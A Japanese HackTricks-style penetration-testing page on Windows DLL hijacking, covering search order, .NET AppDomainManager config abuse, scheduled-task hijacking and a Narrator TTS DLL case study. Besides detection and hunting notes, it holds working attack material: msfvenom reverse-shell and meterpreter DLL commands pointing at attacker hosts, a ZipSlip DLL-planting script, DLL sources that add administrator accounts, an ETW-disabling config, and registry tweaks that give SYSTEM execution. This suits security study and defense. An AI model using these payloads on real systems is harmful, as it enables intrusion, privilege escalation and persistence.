# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションを操作して悪意のある DLL をロードさせる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** など、複数の tactics が含まれます。主に code execution、persistence の確立、そしてあまり一般的ではない privilege escalation に利用されます。ここでは escalation に焦点を当てていますが、hijacking の方法自体は目的にかかわらず同じです。

### 一般的な Techniques

DLL hijacking には複数の方法があり、それぞれの有効性はアプリケーションの DLL loading strategy によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換えます。必要に応じて DLL Proxying を使用し、元の DLL の機能を維持します。
2. **DLL Search Order Hijacking**: 正規の DLL よりも先に検索されるパスに悪意のある DLL を配置し、アプリケーションの検索パターンを悪用します。
3. **Phantom DLL Hijacking**: 存在しない必要な DLL だとアプリケーションに思わせ、ロードさせるための悪意のある DLL を作成します。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意のある DLL に誘導します。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規の DLL を悪意のある DLL に置き換えます。これは DLL side-loading に関連することが多い手法です。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリへ悪意のある DLL を配置します。これは Binary Proxy Execution techniques に似ています。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading は、信頼された **.NET Framework** process に attacker code をロードさせる唯一の方法ではありません。対象の executable が **managed** application の場合、CLR は executable にちなんだ名前の **application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。config が EXE の隣に配置された attacker-controlled assembly を指定している場合、CLR はアプリケーションの通常の code path よりも前にそれをロードし、信頼された process 内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework configuration schema によると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在している必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小限のマネージャー:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践上の注意:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは実際に **managed EXE** でなければなりません。簡易 triage には、`sigcheck -m target.exe`、`corflags target.exe`、または PE metadata の **CLR Runtime Header** の確認を使用できます。
- config filename は executable name と完全に一致する必要があり（`<binary>.config`）、通常は **EXE と同じディレクトリ**に配置されます。
- これは **signed Microsoft/vendor binaries** で有用です。信頼された EXE を変更せずに、悪意のある managed assembly を in-process で実行できます。
- すでに書き込み可能な installer/update directory がある場合、AppDomainManager hijacking を **first stage** として使用し、その後の stage で classic DLL sideloading または reflective loading を実行できます。

### AppDomainManager を downloader + scheduled-task bootstrap として使用

実用的な intrusion pattern では、信頼された managed EXE と、**small bootstrapper** としてのみ動作する悪意のある `*.config` および悪意のある AppDomainManager DLL を組み合わせます。<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` のような信頼できそうな場所から、signed .NET installer または updater を起動します。
2. 隣接する config により、正規の app logic が開始される **前**に CLR が attacker assembly を load します。
3. 悪意のある manager が **path gate** を実行します（例えば、host EXE が `Downloads` から実行されている場合のみ続行し、second stage は `%LOCALAPPDATA%` からのみ実行します）。
4. check に合格すると、`%LOCALAPPDATA%\PerfWatson2.exe` のような user-writable path に real payload を download し、scheduled task で persistence を install します。

この variant が重要な理由:
- signed host EXE は変更されないため、main binary の hash のみを確認する triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移動すると、意図的に chain を破壊できます。
- first-stage AppDomainManager DLL は小さく low-noise に保ち、後から real implant を fetch できます。

この pattern で頻繁に見られる最小限の persistence 例:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` は、そのユーザー／セッションで**利用可能な最高レベル**を意味します。これだけで SYSTEM への昇格が保証されるわけではありません。
- この technique は、古典的な missing-DLL search-order hijacking というより、**.NET config abuse による execution/persistence**として分類する方が適切な場合が多くあります。ただし、攻撃者は両方を組み合わせることがよくあります。

Detection pivots:
- **ZIP extraction paths**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動され、同じ場所に `<exe>.config` が配置された signed .NET executables。
- アクションが `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 配下を指し、名前がブラウザー／vendor の updater に似ている新しい scheduled tasks。
- 別の EXE を直ちに download し、その後 `schtasks.exe` を spawn する短時間だけ実行される managed bootstrap processes。
- 実行ファイルの path が想定された user-profile directory と一致しない限り、早期に終了する samples。

### 既存の scheduled task を hijack して sideload chain を再実行する

persistence のために、**新しい task の作成**だけを探してはいけません。一部の intrusion sets は、正規の installer が**通常の updater task**を作成するまで待機し、その後 **task action を書き換えます**。これにより、既存の名前、author、trigger は維持され、defender にとって見慣れた状態が保たれます。

Reusable workflow:
1. 正規の software を install／run し、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>`／`<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. action だけを置き換え、task が user-writable staging directory にある **trusted host EXE** を起動するようにします。その EXE が real payload を side-load または AppDomain-load します。
4. 新しい明白な persistence artifact を作成する代わりに、同じ task name で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜよりステルス性が高いのか:
- タスク名は正規のものに見せかけられます（例: vendor updater）。
- **Task Scheduler service** が起動するため、親プロセス/祖先プロセスの検証では、`explorer.exe` ではなく、期待されるスケジューリングチェーンとして認識されることがよくあります。
- DFIR チームが **新しいタスク名** だけを探索している場合、登録自体は既存のまま、アクションの参照先だけが `%LOCALAPPDATA%`、`%APPDATA%`、または攻撃者が制御する別のパスに変更されたタスクを見逃す可能性があります。

迅速なハンティングの手掛かり:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と、`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較します。
- **vendor-looking updater task** が **ユーザーによる書き込みが可能なディレクトリ** から実行される場合、または同じディレクトリにある `*.config` ファイルを伴う .NET EXE を起動する場合にアラートを出します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせたステップごとのチェーンについては、以下のワークフローを確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 不足している DLL の発見

システム内で不足している Dll を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルターを設定する**ことです:

![一般的なテクニック - 不足している Dll の発見: システム内で不足している Dll を見つける最も一般的な方法は、sysinternals の procmon を実行し、次の 2 つのフィルターを設定することです](<../../../images/image (961).png>)

![一般的なテクニック - 不足している Dll の発見: システム内で不足している Dll を見つける最も一般的な方法は、sysinternals の procmon を実行し、次の 2 つのフィルターを設定することです](<../../../images/image (230).png>)

そして **File System Activity** だけを表示します:

![一般的なテクニック - 不足している Dll の発見: File System Activity だけを表示する](<../../../images/image (153).png>)

**不足している dll 全般**を探している場合は、これを**数秒間**実行したままにします。\
**特定の実行ファイル内で不足している DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** などの別のフィルターを設定して実行し、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 不足している DLL の悪用

権限を昇格するには、**特権プロセスが、書き込み可能な場所からロードしようとする DLL** を探します。これは、正規の DLL が存在するディレクトリより前に検索されるディレクトリを制御している場合や、要求された DLL が存在せず、検索対象のディレクトリのいずれかに書き込める場合に発生します。

### DLL Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) では、DLL が具体的にどのようにロードされるかを確認できます。**

**Windows applications** は、**事前に定義された検索パス**のセットを、特定の順序に従って DLL を探します。DLL hijacking の問題は、悪意のある DLL がこれらのディレクトリのいずれかに戦略的に配置され、正規の DLL より先にロードされることで発生します。これを防ぐには、アプリケーションが必要な DLL を参照する際に絶対パスを使用するようにします。

以下に **32-bit** システムでの **DLL search order** を示します:

1. アプリケーションがロードされたディレクトリ。
2. システムディレクトリ。[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用して、このディレクトリのパスを取得できます。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows ディレクトリ。[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用して、このディレクトリのパスを取得できます。
1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数に列挙されているディレクトリ。**App Paths** レジストリキーで指定されたアプリケーションごとのパスは含まれないことに注意してください。DLL search path の計算時に **App Paths** キーは使用されません。

これは **SafeDllSearchMode** が有効な場合の**デフォルト**の検索順序です。無効にすると、現在のディレクトリが 2 番目に移動します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0 に設定します（デフォルトでは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出された場合、検索は **LoadLibraryEx** がロードしている実行可能モジュールのディレクトリから開始されます。

最後に、DLL は名前ではなく絶対パスでロードできます。その場合、Windows は DLL 自体についてはそのパスだけを確認します。名前で要求される依存関係については、引き続き該当する検索順序に従います。

検索順序を変更する方法は他にもありますが、ここでは説明しません。

### 任意のファイル書き込みを不足 DLL の hijack につなげる

**関連する technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** のフィルター（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使用して、プロセスが probe したものの見つけられなかった DLL 名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが **schedule/service** 上で実行される場合、これらの名前のいずれかを持つ DLL を **application directory**（search-order entry #1）に配置すると、次回の実行時にロードされます。ある .NET scanner のケースでは、プロセスは `C:\samples\app\` にある `hostfxr.dll` を探してから、`C:\Program Files\dotnet\fxr\...` にある本物のコピーをロードしていました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. primitive が **ZipSlip-style arbitrary write** の場合は、extraction dir から抜け出して DLL が app folder に配置されるような ZIP を作成します:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. archive を監視対象の inbox/share に配置します。scheduled task がプロセスを再起動すると、malicious DLL が読み込まれ、service account としてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成するプロセスの DLL search path に確実に影響を与える高度な方法として、ntdll の native APIs を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath field を設定する方法があります。ここに attacker-controlled directory を指定すると、対象プロセスが名前で imported DLL を解決する場合（absolute path を使用せず、safe loading flags も使用していない場合）、その directory から malicious DLL を読み込ませることができます。

Key idea
- RtlCreateProcessParametersEx を使用して process parameters を構築し、controlled folder を指す custom DllPath を指定します（例：dropper/unpacker が存在する directory）。
- RtlCreateUserProcess でプロセスを作成します。対象 binary が DLL を名前で解決すると、loader は解決時に指定された DllPath を参照するため、malicious DLL が対象 EXE と同じ場所に存在しない場合でも、信頼性の高い sideloading が可能になります。

Notes/limitations
- これは作成される child process に影響します。current process のみに影響する SetDllDirectory とは異なります。
- 対象は DLL を名前で import または LoadLibrary する必要があります（absolute path を使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用していないこと）。
- KnownDLLs と hardcoded absolute paths は hijack できません。Forwarded exports と SxS によって precedence が変わる場合があります。

Minimal C example（ntdll、wide strings、簡略化した error handling）：

<details>
<summary>RTL_USER_PROCESS_PARAMETERS.DllPath による DLL sideloading の強制：Full C example</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

実運用での使用例
- 必要な関数を export するか、実際の DLL へ proxy する悪意のある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の technique を使用して、名前によって xmllite.dll を検索することが知られている署名済みバイナリを起動します。loader は指定された DllPath 経由で import を解決し、DLL を sideload します。

この technique は、実環境で複数段階の sideloading chain を実行するために使用されていることが確認されています。最初の launcher が helper DLL を配置し、その helper DLL が、custom DllPath によって staging directory から attacker の DLL を強制的にロードできる、hijack 可能な Microsoft 署名済みバイナリを起動します。<sup>[[6]](#references)</sup>


### `.exe.config` を介した .NET AppDomainManager hijacking

**.NET Framework** の target では、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、memory を patch せずに **`Main()`** より前に sideloading を実行できます。Win32 DLL search order のみに依存するのではなく、attacker は正規の .NET EXE と、悪意のある config および attacker が制御する 1 つ以上の assembly を同じ場所に配置します。

chain の動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. host EXE が起動し、**CLR が `<exe>.config` を読み取ります**。
2. config が **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定することで、runtime が attacker の制御する `AppDomainManager` を instantiate します。
3. 悪意のある manager が、trusted host process 内で **pre-`Main()` execution** を取得します。
4. 同じ config により、CLR が local assembly を優先して resolve するよう強制できます（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）。また、inline patching なしで runtime validation や telemetry を弱めることもできます。

Campaign-style pattern（directive / CLR version によって正確な nesting は異なる場合があります）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
これが有用な理由:
- **`<probing privatePath="."/>`** は assembly の解決をアプリケーションディレクトリ内に限定し、そのフォルダを予測可能な sideloading の攻撃面にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR の初期化中、正規のアプリケーションロジックが実行される前に、実行を攻撃者の code へ移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong-name validation の失敗なしに、署名されていない assembly や改ざんされた assembly を load できる場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、より新しい assembly への publisher-policy redirect を回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は runtime の選択をより決定論的にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深いものです。implant がメモリ内で `EtwEventWrite` を patch するのではなく、configuration によって **CLR 自身の ETW visibility を無効化**するためです。

近年の campaign で確認されている運用パターン:
- Stage 1 で `setup.exe`、`setup.exe.config`、および local assemblies を配置する。
- Stage 2 でそれらをもっともらしい **AppData update** フォルダへコピーし、host の名前を `update.exe` のようなものに変更して、**scheduled task** 経由で再起動する。
- Stage 3 で、final RAT DLL/export を load する前に execution context（たとえば Task Scheduler から想定される parent `svchost.exe`）を確認する。

Hunting のアイデア:
- user-writable location で、不審な隣接 **`.config`** files とともに実行される、署名済みまたはその他の方法で正規の **.NET executables**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` files。
- **`%LOCALAPPDATA%`** またはアプリケーション固有の `\bin\update\` directories から、名前を変更した update binaries を再起動する scheduled tasks。
- scheduled task が trusted .NET host を起動し、その host が直ちに自身の directory から non-vendor assemblies を load する parent/child chain。

#### Windows docs における DLL search order の例外

Windows documentation では、標準の DLL search order に対する特定の例外が示されています:

- **すでにメモリに load されている DLL と同じ名前の DLL** が検出された場合、system は通常の search を bypass します。代わりに、既定でメモリ内の DLL を使用する前に、redirection と manifest の check を実行します。**この scenario では、system は DLL の search を実行しません**。
- DLL が現在の Windows version における **known DLL** として認識される場合、system は search process を **forgoing して**、その known DLL の version と、それが依存する DLLs を使用します。registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの known DLLs の list が格納されています。
- **DLL に dependencies がある**場合、これらの dependent DLLs の search は、initial DLL が full path によって特定されたかどうかにかかわらず、module names のみで指定されたものとして実行されます。

### Privileges の Escalating

**Requirements**:

- **different privileges**（horizontal または lateral movement）で動作する、または動作する予定の process で、**DLL が欠落している**ものを特定する。
- **DLL** が **search される**すべての **directory** に対して、**write access** が利用可能であることを確認する。この location は executable の directory、または system path 内の directory である可能性があります。

これらの prerequisites はデフォルトでは一般的ではありません。privileged executables に DLL dependencies が欠落していることは通常なく、standard users は通常、system search-path directories に write できないためです。ただし、misconfigured environments では、両方の条件が露呈する可能性があります。\
requirements を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) project を確認してください。主な目的は UAC bypass ですが、特定の Windows versions 向けの DLL-hijacking PoCs が含まれており、見つけた writable directory に合わせて適応できる場合があります。

次の方法で **folder の permissions を check** できることに注意してください:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダの権限を確認**します。
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
以下を使用して、実行ファイルの imports と dll の exports も確認できます。
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path folder**への書き込み権限を利用して**DLL Hijackingで権限昇格する**方法の完全なガイドは、以下を確認してください。


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内の任意のフォルダーに対する書き込み権限があるかを確認します。\
この脆弱性を発見するためのその他の興味深い自動化ツールには、**PowerSploit functions**である _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_があります。

### 例

悪用可能な状況を発見した場合、それを正常に悪用するために最も重要なことの1つは、**実行ファイルがインポートするすべての関数を少なくともエクスポートするDLLを作成すること**です。ただし、DLL Hijackingは、[Medium Integrity levelからHigh **(UACをバイパス)**](../../authentication-credentials-uac-and-efs/index.html#uac)へ、または[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**権限昇格する際に便利です。** **有効なDLLの作成方法**の例は、実行のためのDLL hijackingに焦点を当てた、以下のDLL hijacking studyにあります：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクショ**ンでは、**テンプレート**として、または**不要な関数をエクスポートするDLL**の作成に役立つ可能性がある、いくつかの**基本的なDLLコード**を紹介します。

## **DLLの作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy**とは、**ロード時に悪意のあるコードを実行**できるだけでなく、**実際のライブラリへのすべての呼び出しを中継することで**、**公開**し、**期待どおりに動作**するDLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際に**実行ファイルを指定してproxifyするライブラリを選択し、proxified dllを生成**したり、**DLLを指定してproxified dllを生成**したりできます。

### **Meterpreter**

**rev shellを取得 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成（x86版では、x64版は見つけられませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で作成する

多くの場合、コンパイルする DLL は、被害プロセスが import するすべての関数を **export** する必要があります。必要な export が存在しない場合、バイナリはその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を含むC++ DLLの例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 事例: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き検索します。この DLL は hijack して任意の code execution や persistence に利用できます。<sup>[[7]](#references)</sup>

主な事実
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path に writable な attacker-controlled DLL が存在すると、ロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Procmon を使用した Discovery
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動し、上記 path の load 試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 素朴な hijack は UI に発言やハイライトを発生させます。静かに実行するには、attach 時に Narrator のスレッドを列挙し、メインスレッドを (`OpenThread(THREAD_SUSPEND_RESUME)`) で開いて `SuspendThread` します。その後、自分のスレッドで処理を続行します。完全なコードについては PoC を参照してください。<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に仕込んだ DLL が読み込まれます。secure desktop（logon screen）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host に RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が secure desktop 上で SYSTEM として実行されます。
- RDP session が閉じると実行が停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込み Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すよう編集して import した後、`configuration` をその AT 名に設定できます。これにより、Accessibility framework 下で任意の実行を proxy できます。

Notes
- `%windir%\System32` 配下への書き込みと HKLM 値の変更には admin rights が必要です。
- すべての payload logic は `DLL_PROCESS_ATTACH` に配置できます。exports は必要ありません。

## Case Study: CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation

